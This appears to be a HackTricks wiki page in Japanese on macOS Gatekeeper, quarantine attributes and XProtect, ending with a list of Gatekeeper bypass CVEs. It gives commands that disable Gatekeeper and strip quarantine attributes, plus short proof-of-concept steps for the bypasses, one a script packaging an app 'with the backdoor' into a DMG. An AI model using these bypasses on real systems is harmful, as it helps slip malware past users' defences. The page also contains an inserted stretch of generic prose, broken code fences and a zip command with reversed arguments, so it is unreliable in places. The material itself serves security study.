# macOS Gatekeeper / Quarantine / XProtect

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ会社**で働いていますか？**HackTricksであなたの会社を広告したいですか？** または、**最新版のPEASSを入手**したり、**HackTricksをPDFでダウンロード**したいですか？[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見してください。これは私たちの独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* **[**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)に参加するか、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**にフォローしてください。**
* **ハッキングのコツを共有するために、**[**hacktricksリポジトリ**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloudリポジトリ**](https://github.com/carlospolop/hacktricks-cloud) **にPRを提出してください。**
*
* .

</details>

## Gatekeeper

**Gatekeeper**は、ユーザーがシステム上で**信頼できるソフトウェアのみを実行する**ことを保証するために開発された、Macオペレーティングシステムのセキュリティ機能です。App Store以外の**ソースからダウンロードして開こうとする**ソフトウェア、例えばアプリ、プラグイン、インストーラーパッケージを**検証する**ことによって機能します。

Gatekeeperの主要なメカニズムは、その**検証**プロセスにあります。ダウンロードされたソフトウェアが**認識された開発者によって署名されているか**をチェックし、ソフトウェアの真正性を保証します。さらに、ソフトウェアがAppleによって**公証されているか**を確認し、既知の悪意のあるコンテンツが含まれていないこと、および公証後に改ざんされていないことを確認します。

さらに、Gatekeeperは、ダウンロードしたソフトウェアを初めて開く際にユーザーに**承認を求める**ことで、ユーザーコントロールとセキュリティを強化します。このセーフガードは、ユーザーが誤って有害な実行可能コードを無害なデータファイルと間違えて実行することを防ぐのに役立ちます。

### アプリケーション署名

アプリケーション署名、またはコード署名は、Appleのセキュリティインフラストラクチャの重要な構成要素です。これらは、ソフトウェアの作者（開発者）の**身元を検証し**、最後に署名されてからコードが改ざんされていないことを保証するために使用されます。

ここにその仕組みがあります：

1. **アプリケーションの署名：** 開発者がアプリケーションの配布準備ができたら、**プライベートキーを使用してアプリケーションに署名します**。このプライベートキーは、Apple Developer Programに登録する際にAppleが開発者に発行する**証明書に関連付けられています**。署名プロセスには、アプリのすべての部分の暗号化ハッシュを作成し、このハッシュを開発者のプライベートキーで暗号化することが含まれます。
2. **アプリケーションの配布：** 署名されたアプリケーションは、対応する公開キーを含む開発者の証明書と共にユーザーに配布されます。
3. **アプリケーションの検証：** ユーザーがダウンロードして実行しようとすると、Macオペレーティングシステムは開発者の証明書からの公開キーを使用してハッシュを復号します。その後、アプリケーションの現在の状態に基づいてハッシュを再計算し、これを復号されたハッシュと比較します。一致すれば、**アプリケーションは開発者が署名してから変更されていない**ということで、システムはアプリケーションの実行を許可します。

アプリケーション署名は、AppleのGatekeeperテクノロジーの不可欠な部分です。ユーザーが**インターネットからダウンロードしたアプリケーションを開こうとする**と、Gatekeeperはアプリケーション署名を検証します。それがAppleによって発行された証明書で署名された既知の開発者のものであり、コードが改ざんされていない場合、Gatekeeperはアプリケーションの実行を許可します。そうでない場合は、アプリケーションをブロックし、ユーザーに警告します。

macOS Catalinaから始まり、**GatekeeperはアプリケーションがAppleによって公証されているかどうかもチェックします**。これにより、セキュリティの追加層が追加されます。公証プロセスでは、アプリケーションを既知のセキュリティ問題と悪意のあるコードに対してチェックし、これらのチェックが通れば、Gatekeeperが検証できるチケットをアプリケーションに追加します。

#### 署名のチェック

**マルウェアサンプル**をチェックする際には、バイナリの**署名を常に確認**するべきです。署名した**開発者**が既に**マルウェア**と**関連している**可能性があります。
```bash
# Get signer
codesign -vv -d /bin/ls 2>&1 | grep -E "Authority|TeamIdentifier"

# Check if the app’s contents have been modified
codesign --verify --verbose /Applications/Safari.app

# Get entitlements from the binary
codesign -d --entitlements :- /System/Applications/Automator.app # Check the TCC perms

# Check if the signature is valid
spctl --assess --verbose /Applications/Safari.app

# Sign a binary
codesign -s <cert-name-keychain> toolsdemo
```
### ノタリゼーション

Appleのノタリゼーションプロセスは、ユーザーを潜在的に有害なソフトウェアから守るための追加の安全対策として機能します。これには、**開発者がアプリケーションを審査のために** **Appleのノータリサービス**に提出することが含まれます。このサービスはApp Reviewと混同してはならず、**自動化されたシステム**であり、提出されたソフトウェアを**悪意のあるコンテンツ**やコード署名に関する潜在的な問題の存在について精査します。

ソフトウェアがこの検査を問題なく**合格**すると、ノータリサービスはノタリゼーションチケットを生成します。その後、開発者はこのチケットをソフトウェアに**添付する**必要があります。これは「ステープリング」と呼ばれるプロセスです。さらに、ノタリゼーションチケットはオンラインでも公開され、Appleのセキュリティ技術であるGatekeeperがアクセスできるようになっています。

ユーザーが初めてソフトウェアをインストールまたは実行する際、実行可能ファイルにステープリングされているかオンラインで見つかったかにかかわらず、ノタリゼーションチケットの存在は**ソフトウェアがAppleによってノタリゼーションされたことをGatekeeperに通知します**。その結果、Gatekeeperは初回起動ダイアログに説明的なメッセージを表示し、ソフトウェアがAppleによる悪意のあるコンテンツのチェックを受けたことを示します。このプロセスにより、ユーザーは自分のシステムにインストールまたは実行するソフトウェアのセキュリティに対する信頼を高めることができます。

### GateKeeperの列挙

GateKeeperは、信頼されていないアプリが実行されるのを防ぐ**いくつかのセキュリティコンポーネント**であり、また**コンポーネントの1つ**でもあります。

GateKeeperの**ステータス**を確認することができます：
```bash
# Check the status
spctl --status
```
{% hint style="danger" %}
GateKeeperの署名チェックは、**隔離属性を持つファイル**にのみ実行され、すべてのファイルに対して実行されるわけではありません。
{% endhint %}

GateKeeperは、**設定と署名**に従ってバイナリが実行可能かどうかをチェックします：

<figure><img src="../../../.gitbook/assets/image (678).png" alt=""><figcaption></figcaption></figure>

この設定を保持するデータベースは **`/var/db/SystemPolicy`** にあります。rootとしてこのデータベースをチェックできます：
```bash
# Open database
sqlite3 /var/db/SystemPolicy

# Get allowed rules
SELECT requirement,allow,disabled,label from authority where label != 'GKE' and disabled=0;
requirement|allow|disabled|label
anchor apple generic and certificate 1[subject.CN] = "Apple Software Update Certification Authority"|1|0|Apple Installer
anchor apple|1|0|Apple System
anchor apple generic and certificate leaf[field.1.2.840.113635.100.6.1.9] exists|1|0|Mac App Store
anchor apple generic and certificate 1[field.1.2.840.113635.100.6.2.6] exists and (certificate leaf[field.1.2.840.113635.100.6.1.14] or certificate leaf[field.1.2.840.113635.100.6.1.13]) and notarized|1|0|Notarized Developer ID
[...]
```
最初のルールが"**App Store**"で終わり、2番目のルールが"**Developer ID**"で終わっていること、そして前の画像では**App Storeと認識された開発者からのアプリを実行することが有効になっていた**ことに注意してください。\
その設定をApp Storeに**変更する**と、"**Notarized Developer ID"のルールが消える**でしょう。

また、**type GKE**のルールが数千もあります：
```bash
SELECT requirement,allow,disabled,label from authority where label = 'GKE' limit 5;
cdhash H"b40281d347dc574ae0850682f0fd1173aa2d0a39"|1|0|GKE
cdhash H"5fd63f5342ac0c7c0774ebcbecaf8787367c480f"|1|0|GKE
cdhash H"4317047eefac8125ce4d44cab0eb7b1dff29d19a"|1|0|GKE
cdhash H"0a71962e7a32f0c2b41ddb1fb8403f3420e1d861"|1|0|GKE
cdhash H"8d0d90ff23c3071211646c4c9c607cdb601cb18f"|1|0|GKE
```
以下は、**`/var/db/SystemPolicyConfiguration/gke.bundle/Contents/Resources/gke.auth`、`/var/db/gke.bundle/Contents/Resources/gk.db`** および **`/var/db/gkopaque.bundle/Contents/Resources/gkopaque.db`** から得られるハッシュです。

または、以下のコマンドで前述の情報をリストすることができます：
```bash
sudo spctl --list
```
オプション **`--master-disable`** と **`--global-disable`** は、**`spctl`** のこれらの署名チェックを完全に**無効化**します：
```bash
# Disable GateKeeper
spctl --global-disable
spctl --master-disable

# Enable it
spctl --global-enable
spctl --master-enable
```
完全に有効にすると、新しいオプションが表示されます：

<figure><img src="../../../.gitbook/assets/image (679).png" alt=""><figcaption></figcaption></figure>

**GateKeeperによってアプリが許可されるかどうかを確認する**ことができます：
```bash
spctl --assess -v /Applications/App.app
```
GateKeeperに新しいルールを追加して、特定のアプリの実行を許可することができます:
```bash
# Check if allowed - nop
spctl --assess -v /Applications/App.app
/Applications/App.app: rejected
source=no usable signature

# Add a label and allow this label in GateKeeper
sudo spctl --add --label "whitelist" /Applications/App.app
sudo spctl --enable --label "whitelist"

# Check again - yep
spctl --assess -v /Applications/App.app
/Applications/App.app: accepted
```
### カレンタインファイル

特定のmacOS **アプリケーション**（ウェブブラウザーやメールクライアントなど）は、アプリケーションやファイルを**ダウンロード**する際に、一般的に"**カレンタインフラグ**"として知られる拡張ファイル属性をダウンロードしたファイルに**付加します**。この属性は、ファイルが信頼できないソース（インターネット）から来たものであり、リスクを伴う可能性があることを**マークする**ためのセキュリティ対策として機能します。しかし、この属性を付加するアプリケーションはすべてではありません。例えば、一般的なBitTorrentクライアントソフトウェアは通常、このプロセスをバイパスします。

**カレンタインフラグの存在は、ユーザーがファイルを実行しようとしたときにmacOSのGatekeeperセキュリティ機能に信号を送ります**。

**カレンタインフラグが存在しない**場合（一部のBitTorrentクライアントでダウンロードされたファイルなど）、Gatekeeperの**チェックが実行されない**可能性があります。したがって、ユーザーはセキュリティが低い、または不明なソースからダウンロードしたファイルを開く際には注意が必要です。

{% hint style="info" %}
コード署名の**有効性をチェックする**ことは、コードとそのすべてのバンドルされたリソースの暗号学的な**ハッシュ**を生成することを含む**リソース集約型**のプロセスです。さらに、証明書の有効性をチェックするには、発行後に取り消されていないかを確認するためにAppleのサーバーに対して**オンラインチェック**を行う必要があります。これらの理由から、完全なコード署名と公証チェックをアプリが起動されるたびに実行することは**非現実的です**。

したがって、これらのチェックは**カレンタイン属性を持つアプリを実行するときにのみ実行されます。**
{% endhint %}

{% hint style="warning" %}
この属性は、ファイルを**作成/ダウンロードするアプリケーションによって設定されなければなりません**。

ただし、サンドボックス化されたファイルは、作成されたすべてのファイルにこの属性が設定されます。そして、サンドボックス化されていないアプリは、自ら設定することもできますし、**Info.plist**内の[**LSFileQuarantineEnabled**](https://developer.apple.com/documentation/bundleresources/information_property_list/lsfilequarantineenabled?language=objc)キーを指定することで、作成されたファイルに`com.apple.quarantine`拡張属性をシステムが設定するようにすることもできます。
{% endhint %}

その状態を**確認し、有効/無効にする**ことが可能です（rootが必要です）：
```bash
spctl --status
assessments enabled

spctl --enable
spctl --disable
#You can also allow nee identifies to execute code using the binary "spctl"
```
You can also **ファイルに検疫拡張属性があるかどうかを確認する** with:
```bash
xattr file.png
com.apple.macl
com.apple.quarantine
```
```
xattr -l /path/to/application
```

これにより、アプリケーションに関連付けられた拡張属性の値を確認し、隔離属性を書き込んだアプリを特定できます。
```bash
xattr -l portada.png
com.apple.macl:
00000000  03 00 53 DA 55 1B AE 4C 4E 88 9D CA B7 5C 50 F3  |..S.U..LN.....P.|
00000010  16 94 03 00 27 63 64 97 98 FB 4F 02 84 F3 D0 DB  |....'cd...O.....|
00000020  89 53 C3 FC 03 00 27 63 64 97 98 FB 4F 02 84 F3  |.S....'cd...O...|
00000030  D0 DB 89 53 C3 FC 00 00 00 00 00 00 00 00 00 00  |...S............|
00000040  00 00 00 00 00 00 00 00                          |........|
00000048
com.apple.quarantine: 00C1;607842eb;Brave;F643CD5F-6071-46AB-83AB-390BA944DEC5
# 00c1 -- It has been allowed to eexcute this file (QTN_FLAG_USER_APPROVED = 0x0040)
# 607842eb -- Timestamp
# Brave -- App
# F643CD5F-6071-46AB-83AB-390BA944DEC5 -- UID assigned to the file downloaded
```
実際にはプロセスは「作成したファイルに検疫フラグを設定することができる」（作成したファイルにUSER\_APPROVEDフラグを適用しようとしましたが、適用されませんでした）：

<details>

<summary>検疫フラグを適用するソースコード</summary>
```c
#include <stdio.h>
#include <stdlib.h>

enum qtn_flags {
QTN_FLAG_DOWNLOAD = 0x0001,
QTN_FLAG_SANDBOX = 0x0002,
QTN_FLAG_HARD = 0x0004,
QTN_FLAG_USER_APPROVED = 0x0040,
};

#define qtn_proc_alloc _qtn_proc_alloc
#define qtn_proc_apply_to_self _qtn_proc_apply_to_self
#define qtn_proc_free _qtn_proc_free
#define qtn_proc_init _qtn_proc_init
#define qtn_proc_init_with_self _qtn_proc_init_with_self
#define qtn_proc_set_flags _qtn_proc_set_flags
#define qtn_file_alloc _qtn_file_alloc
#define qtn_file_init_with_path _qtn_file_init_with_path
#define qtn_file_free _qtn_file_free
#define qtn_file_apply_to_path _qtn_file_apply_to_path
#define qtn_file_set_flags _qtn_file_set_flags
#define qtn_file_get_flags _qtn_file_get_flags
#define qtn_proc_set_identifier _qtn_proc_set_identifier

typedef struct _qtn_proc *qtn_proc_t;
typedef struct _qtn_file *qtn_file_t;

int qtn_proc_apply_to_self(qtn_proc_t);
void qtn_proc_init(qtn_proc_t);
int qtn_proc_init_with_self(qtn_proc_t);
int qtn_proc_set_flags(qtn_proc_t, uint32_t flags);
qtn_proc_t qtn_proc_alloc();
void qtn_proc_free(qtn_proc_t);
qtn_file_t qtn_file_alloc(void);
void qtn_file_free(qtn_file_t qf);
int qtn_file_set_flags(qtn_file_t qf, uint32_t flags);
uint32_t qtn_file_get_flags(qtn_file_t qf);
int qtn_file_apply_to_path(qtn_file_t qf, const char *path);
int qtn_file_init_with_path(qtn_file_t qf, const char *path);
int qtn_proc_set_identifier(qtn_proc_t qp, const char* bundleid);

int main() {

qtn_proc_t qp = qtn_proc_alloc();
qtn_proc_set_identifier(qp, "xyz.hacktricks.qa");
qtn_proc_set_flags(qp, QTN_FLAG_DOWNLOAD | QTN_FLAG_USER_APPROVED);
qtn_proc_apply_to_self(qp);
qtn_proc_free(qp);

FILE *fp;
fp = fopen("thisisquarantined.txt", "w+");
fprintf(fp, "Hello Quarantine\n");
fclose(fp);

return 0;

}
```
</details>

そして、その属性を**削除**するには：
```bash
xattr -d com.apple.quarantine portada.png
#You can also remove this attribute from every file with
find . -iname '*' -print0 | xargs -0 xattr -d com.apple.quarantine
```
```
xattr -r ~/Downloads
```

macOSのGatekeeperは、インターネットからダウンロードされたアプリケーションやソフトウェアをチェックし、信頼できる開発者からのものであるか、Appleによって認証されたものであるかを確認します。これにより、マルウェアのインストールを防ぐことができます。しかし、Gatekeeperは完璧ではありません。悪意のあるアクターは、この保護を回避する方法を見つけることがあります。

Gatekeeperの設定は、システム環境設定の「セキュリティとプライバシー」セクションで管理できます。ユーザーは、App Storeからのアプリのみを許可する、App Storeと認証された開発者からのアプリを許可する、またはどこからでもアプリを許可する、という選択肢があります。

Gatekeeperは、ダウンロードしたファイルに「隔離」属性を付与することで機能します。この属性は、ファイルがインターネットから来たことを示し、ユーザーがそれを開く前に警告を表示します。隔離されたファイルは、以下のコマンドで見つけることができます：

{% code overflow="wrap" %}
```
xattr -r ~/Downloads
```

このコマンドは、ダウンロードフォルダ内のすべてのファイルに設定されている拡張属性を再帰的にリストします。隔離属性は、`com.apple.quarantine`として表示されます。

Gatekeeperを回避する一般的な方法は、`xattr`コマンドを使用して隔離属性を削除することです。これにより、Gatekeeperの警告なしでファイルを開くことができます。ただし、これはセキュリティリスクを高めるため、注意が必要です。

Gatekeeperの保護を強化するためには、以下のような追加のステップを踏むことが推奨されます：

- システム環境設定で、App Storeからのアプリのみを許可する設定を選択する。
- 不明な開発者からのアプリケーションをインストールする前に、その信頼性を確認する。
- 定期的にソフトウェアアップデートを行い、セキュリティパッチを適用する。

Gatekeeperは有用なセキュリティ機能ですが、ユーザーは他のセキュリティ対策と組み合わせて使用することが重要です。
```bash
find / -exec ls -ld {} \; 2>/dev/null | grep -E "[x\-]@ " | awk '{printf $9; printf "\n"}' | xargs -I {} xattr -lv {} | grep "com.apple.quarantine"
```
{% endcode %}

隔離情報は、**`~/Library/Preferences/com.apple.LaunchServices.QuarantineEventsV2`** にあるLaunchServicesが管理する中央データベースにも保存されます。

#### **Quarantine.kext**

カーネル拡張は、**システム上のカーネルキャッシュを通じてのみ利用可能**ですが、**https://developer.apple.com/** から**カーネルデバッグキット**をダウンロードすることができ、シンボリケートされた拡張のバージョンが含まれています。

### XProtect

XProtectはmacOSに組み込まれた**アンチマルウェア**機能です。XProtectは、アプリケーションが初めて起動されたり変更されたりした際に、既知のマルウェアや安全でないファイルタイプのデータベースと**照合します**。Safari、Mail、Messagesなどの特定のアプリを通じてファイルをダウンロードすると、XProtectは自動的にファイルをスキャンします。データベースにある既知のマルウェアと一致した場合、XProtectは**ファイルの実行を防ぎ**、脅威について警告します。

XProtectのデータベースは、Appleによって新しいマルウェア定義で**定期的に更新**され、これらの更新は自動的にダウンロードされてMacにインストールされます。これにより、XProtectは常に最新の既知の脅威に対応しています。

ただし、**XProtectは完全な機能を持つアンチウイルスソリューションではない**ことに注意が必要です。特定の既知の脅威リストのみをチェックし、ほとんどのアンチウイルスソフトウェアのようなオンアクセススキャンは実行しません。

最新のXProtectアップデートに関する情報を取得するには：

{% code overflow="wrap" %}
```bash
system_profiler SPInstallHistoryDataType 2>/dev/null | grep -A 4 "XProtectPlistConfigData" | tail -n 5
```
{% endcode %}

XProtectは、SIP保護された場所である **`/Library/Apple/System/Library/CoreServices/XProtect.bundle`** に位置しており、バンドル内にはXProtectが使用する情報があります：

* **`XProtect.bundle/Contents/Resources/LegacyEntitlementAllowlist.plist`**: これらのcdhashesを持つコードがレガシー権限を使用できるようにします。
* **`XProtect.bundle/Contents/Resources/XProtect.meta.plist`**: BundleIDとTeamIDによってロードが許可されないプラグインや拡張機能のリスト、または最小バージョンを示します。
* **`XProtect.bundle/Contents/Resources/XProtect.yara`**: マルウェアを検出するためのYaraルール。
* **`XProtect.bundle/Contents/Resources/gk.db`**: ブロックされたアプリケーションとTeamIDsのハッシュを含むSQLite3データベース。

**`/Library/Apple/System/Library/CoreServices/XProtect.app`** にはGatekeeperプロセスに関与しないXProtectに関連する別のアプリがあることに注意してください。

### Gatekeeperではない

{% hint style="danger" %}
Gatekeeperはアプリケーションを実行する**毎回実行されるわけではない**ことに注意してください。_**AppleMobileFileIntegrity**_ (AMFI)は、Gatekeeperによって既に実行および検証されたアプリを実行する際にのみ、**実行可能コードの署名を検証**します。
{% endhint %}

したがって、以前はGatekeeperでキャッシュした後にアプリケーションの実行可能でないファイル（Electron asarやNIBファイルなど）を**変更**し、他の保護がない場合、アプリケーションは**悪意のある**追加物とともに**実行**されました。

しかし、現在はmacOSがアプリケーションバンドル内のファイルの**変更を防ぐ**ため、これは不可能です。[Dirty NIB](../macos-proces-abuse/macos-dirty-nib.md)攻撃を試みると、Gatekeeperでキャッシュした後にバンドルを変更することはできないことがわかります。例えば、Contentsディレクトリの名前をNotConに変更し（エクスプロイトで示されているように）、Gatekeeperでキャッシュするためにアプリのメインバイナリを実行すると、エラーが発生し実行されません。

## Gatekeeperのバイパス

Gatekeeperをバイパスする方法（ユーザーが何かをダウンロードして実行することをGatekeeperが禁止すべき場合）は、macOSの脆弱性と見なされます。これらは、過去にGatekeeperをバイパスすることを可能にした技術に割り当てられたCVEです：

### [CVE-2021-1810](https://labs.withsecure.com/publications/the-discovery-of-cve-2021-1810)

**Archive Utility**によって抽出された場合、886文字を超えるファイル**パスはcom.apple.quarantine拡張属性を継承しないため、そのファイルに対してGatekeeperを**バイパスすることが可能でした。

詳細については、[**元のレポート**](https://labs.withsecure.com/publications/the-discovery-of-cve-2021-1810)を確認してください。

### [CVE-2021-30990](https://ronmasas.com/posts/bypass-macos-gatekeeper)

**Automator**で作成されたアプリケーションの場合、実行に必要な情報は実行可能ファイルではなく`application.app/Contents/document.wflow`内にあります。実行可能ファイルは、**Automator Application Stub**と呼ばれる一般的なAutomatorバイナリです。

したがって、`application.app/Contents/MacOS/Automator\ Application\ Stub`をシステム内の別の**Automator Application Stubへのシンボリックリンクで指す**ことができ、それは`document.wflow`内のもの（あなたのスクリプト）を実行します。実際の実行可能ファイルには隔離xattrがないため、**Gatekeeperをトリガーしません**。&#x20;

予想される場所の例：`/System/Library/CoreServices/Automator\ Application\ Stub.app/Contents/MacOS/Automator\ Application\ Stub`

詳細については、[**元のレポート**](https://ronmasas.com/posts/bypass-macos-gatekeeper)を確認してください。

### [CVE-2022-22616](https://www.jamf.com/blog/jamf-threat-labs-safari-vuln-gatekeeper-bypass/)

このバイパスでは、`application.app`ではなく`application.app/Contents`から圧縮を開始するアプリケーションを含むzipファイルが作成されました。したがって、**隔離属性**は`application.app/Contents`の**すべてのファイルに**適用されましたが、**`application.app`には適用されませんでした**。Gatekeeperがチェックしていたのは`application.app`であるため、`application.app`がトリガーされたときに**隔離属性がなかったため**、Gatekeeperはバイパスされました。
```bash
zip -r test.app/Contents test.zip
```
詳細については、[**元のレポート**](https://www.jamf.com/blog/jamf-threat-labs-safari-vuln-gatekeeper-bypass/)をご覧ください。

### [CVE-2022-32910](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-32910)

コンポーネントが異なるにもかかわらず、この脆弱性の悪用は前述のものと非常に似ています。このケースでは、**`application.app/Contents`** からApple Archiveを生成するので、**Archive Utility** によって解凍された時に **`application.app`** は隔離属性を受け取らないでしょう。
```bash
aa archive -d test.app/Contents -o test.app.aar
```
詳細については、[**オリジナルのレポート**](https://www.jamf.com/blog/jamf-threat-labs-macos-archive-utility-vulnerability/)をご覧ください。

### [CVE-2022-42821](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/)

ACLの**`writeextattr`**は、ファイルに属性を書き込むことを誰にも防ぐために使用できます：
```bash
touch /tmp/no-attr
chmod +a "everyone deny writeextattr" /tmp/no-attr
xattr -w attrname vale /tmp/no-attr
xattr: [Errno 13] Permission denied: '/tmp/no-attr'
```
さらに、**AppleDouble** ファイル形式は、ACEを含むファイルのコピーを作成します。

[**ソースコード**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html)では、xattr **`com.apple.acl.text`** に保存されたACLのテキスト表現が解凍されたファイルのACLとして設定されることがわかります。したがって、他のxattrが書き込まれることを防ぐACLを持つアプリケーションを**AppleDouble** ファイル形式でzipファイルに圧縮した場合...隔離xattrはアプリケーションに設定されませんでした：

{% code overflow="wrap" %}
```bash
chmod +a "everyone deny write,writeattr,writeextattr" /tmp/test
ditto -c -k test test.zip
python3 -m http.server
# Download the zip from the browser and decompress it, the file should be without a quarantine xattr
```
{% endcode %}

詳細については、[**オリジナルのレポート**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/)をご覧ください。

これはAppleArchivesを利用しても悪用される可能性があります：
```bash
mkdir app
touch app/test
chmod +a "everyone deny write,writeattr,writeextattr" app/test
aa archive -d app -o test.aar
```
### [CVE-2023-27943](https://blog.f-secure.com/discovery-of-gatekeeper-bypass-cve-2023-27943/)

**Google ChromeがmacOSの内部問題のためにダウンロードしたファイルに検疫属性を設定していなかった**ことが発見されました。

### [CVE-2023-27951](https://redcanary.com/blog/gatekeeper-bypass-vulnerabilities/)

AppleDoubleファイル形式は、`._`で始まる別のファイルにファイルの属性を保存し、これにより**macOSマシン間で**ファイル属性をコピーするのに役立ちます。しかし、AppleDoubleファイルを解凍した後、`._`で始まるファイルに**検疫属性が与えられていない**ことが指摘されました。

{% code overflow="wrap" %}
```bash
mkdir test
echo a > test/a
echo b > test/b
echo ._a > test/._a
aa archive -d test/ -o test.aar

# If you downloaded the resulting test.aar and decompress it, the file test/._a won't have a quarantitne attribute
```
{% endcode %}

検疫属性が設定されていないファイルを作成できることで、**Gatekeeperをバイパスすることが可能でした。** このトリックは、AppleDoubleの命名規則を使用して（`._`で始まる）**DMGファイルアプリケーションを作成し**、検疫属性のないこの隠しファイルへの**可視ファイルをシンボリックリンクとして作成する**ことでした。\
**dmgファイルが実行されると**、検疫属性がないため**Gatekeeperをバイパスします**。
```bash
# Create an app bundle with the backdoor an call it app.app

echo "[+] creating disk image with app"
hdiutil create -srcfolder app.app app.dmg

echo "[+] creating directory and files"
mkdir
mkdir -p s/app
cp app.dmg s/app/._app.dmg
ln -s ._app.dmg s/app/app.dmg

echo "[+] compressing files"
aa archive -d s/ -o app.aar
```
### クォランティン xattr の防止

".app" バンドルにクォランティン xattr が追加されていない場合、実行時に **Gatekeeper はトリガーされません**。

<details>

<summary><strong>AWS ハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>をご覧ください！</strong></summary>

HackTricks をサポートする他の方法:

* **HackTricks にあなたの会社を広告したい**、または **HackTricks を PDF でダウンロードしたい** 場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式 PEASS & HackTricks グッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な [**NFT**](https://opensea.io/collection/the-peass-family) コレクションをチェックする
* 💬 [**Discord グループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**テレグラムグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm) を **フォローする**。
* [**HackTricks**](https://github.com/carlospolop/hacktricks) および [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) の GitHub リポジトリに PR を提出して、あなたのハッキングのコツを **共有する**。

</details>
